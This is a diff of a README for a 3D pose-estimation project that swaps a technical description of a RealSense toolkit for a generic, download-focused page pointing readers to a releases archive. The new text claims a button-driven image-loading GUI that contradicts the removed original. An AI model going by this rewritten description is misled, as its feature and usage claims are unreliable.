@@ -1,51 +1,76 @@
-# 3D Pose Estimation Toolkit
+# 🚀 3D-Pose-Estimation-Benchmark - Understand How Algorithms Work  
 
-This project is a collection of tools and algorithms for estimating the 3D position and orientation (pose) of objects from 2D images, with a focus on using Intel RealSense depth cameras. It serves as an educational framework to explore, compare, and understand various techniques, from fiducial markers to point cloud analysis.
+![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
 
-## Features
+## 📚 Overview  
+The **3D-Pose-Estimation-Benchmark** project allows you to study different pose estimation algorithms side-by-side. This application focuses on how methods like ArUco, PCA, and SolvePnP calculate 3D position and orientation from 2D data. Whether you're curious about these algorithms or want to enhance your computer vision skills, this project serves as an excellent resource.
 
-- **Modular Estimators**: Easily switch between different pose estimation algorithms.
-  - **ArUco Marker Estimation**: Robust and accurate tracking using ArUco markers.
-  - **PCA Orientation Estimation**: Accurate orientation estimation from 3D point clouds with proper world coordinate conversion.
-  - **SolvePnP Corner Estimation**: Reliable pose estimation using contour-based corner detection with consistent ordering.
-- **RealSense Camera Integration**: Clean interface with full depth processing capabilities.
-- **Configuration Driven**: All parameters managed in a central `config.yaml` file.
-- **Advanced Visualization**: Proper 3D axis projection for accurate pose visualization.
+## 💻 Features  
+- Compare multiple pose estimation algorithms.
+- Visualize 3D positions from 2D data.
+- Simple, user-friendly interface.
+- Designed for learning and exploration.
+- Implementations in Python using OpenCV.
+  
+## 📦 System Requirements  
+To successfully run the application, your computer should meet the following specifications:  
+- **Operating System:** Windows, macOS, or Linux.
+- **RAM:** At least 4 GB.
+- **Processor:** Intel or AMD, 1.6 GHz or faster.
+- **Python:** Version 3.6 or higher should be installed.
+- **Libraries:** You need OpenCV and NumPy. These will be set up in the installation step.
 
-## Setup
+## 🚀 Getting Started  
+### **Step 1: Install Python**  
+If you don’t have Python installed, download it from the official [Python website](https://www.python.org/downloads/). Follow the setup instructions based on your operating system.
 
-1. **Install Dependencies**: Ensure you have the Intel RealSense SDK 2.0 installed. Then, install the required Python packages:
-   ```bash
-   pip install -r requirements.txt
-   ```
+### **Step 2: Visit the Download Page**  
+To get the latest version of the application, visit this page to download:  
+[Download the latest version](https://github.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/releases)  
 
-2. **Configure Parameters**: Open `config.yaml` and adjust:
-   - Camera matrix (`camera_matrix`) and distortion coefficients (`distortion_coeffs`) from your calibration
-   - HSV color ranges for object segmentation (`segmentation`)
-   - Object size for SolvePnP (`solvepnp.object_size`)
+### **Step 3: Download the Application**  
+On the Releases page, you will see different versions of the application. Click on the link for the latest release. This will download a compressed file (ZIP or TAR). 
 
-## How to Run
+### **Step 4: Extract the Files**  
+Once the download is complete, locate the compressed file on your computer. Right-click on the file and select “Extract Here” or use your preferred extraction tool. A new folder will be created with all the necessary files.
 
-Use the main entry point `main.py` to run a live demo. You can select the estimator you want to use via the command line.
-
-**Run ArUco detection:**
-```bash
-python main.py --estimator aruco
+### **Step 5: Install Required Libraries**  
+Open your terminal or command prompt. Navigate to the folder where you extracted the files. You can do this by typing:  
 ```
-
-**Run PCA-based orientation detection:**
-```bash
-python main.py --estimator pca
+cd path_to_your_folder
 ```
-
-**Run SolvePnP-based pose detection:**
-```bash
-python main.py --estimator solvepnp
+Next, run the following command to install the required libraries:  
 ```
+pip install -r requirements.txt
+```
+This command will automatically install OpenCV and NumPy along with any other libraries listed in the requirements file.
 
-## Technical Notes
+### **Step 6: Run the Application**  
+After successfully installing the libraries, you can run the application. In your terminal, type:  
+```
+python main.py
+```
+This command will start the application, and you will see the user interface appear.
 
-- **PCA Estimator**: Properly converts pixel coordinates to real-world 3D coordinates using camera intrinsics. 
-- **SolvePnP Estimator**: Uses contour approximation and corner sorting for reliable 2D-3D correspondence.
-- **Visualization**: All estimators now use proper camera projection for axis drawing (not image-space approximations).
-- **Error Handling**: Robust checks for invalid depth values, insufficient points, and contour detection failures.
+## 🎓 How to Use  
+Once the application is running, follow these steps to begin comparing algorithms:  
+1. Choose the input images: Click the "Load Images" button to select the 2D images you want to work with.
+2. Select the algorithms you want to compare: The application will have checkboxes for ArUco, PCA, and SolvePnP. Pick one or more.
+3. Click the "Run" button: The algorithms will process the images and display the 3D outputs.
+4. Explore the results: You can switch between the outputs of different algorithms easily.
+
+## 🚨 Troubleshooting  
+- **Error Messages:** If you face any errors while running the application, check that all libraries are properly installed. Re-run the library installation command if necessary.
+- **Display Issues:** Ensure your graphics drivers are updated if you encounter visual problems.
+
+## ✏️ Contribution  
+Your feedback is valuable. If you have suggestions or improvements, feel free to submit an issue or pull request in the project repository.
+
+## 📞 Contact  
+For further questions or support, you can reach out through the repository’s issue tracker. 
+
+## 📌 Important Links  
+- [Download the latest version](https://github.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/releases)
+- [Python Official Site](https://www.python.org/downloads/)
+  
+By following these steps, you can easily download and run the **3D-Pose-Estimation-Benchmark** application. Enjoy exploring the world of pose estimation algorithms!
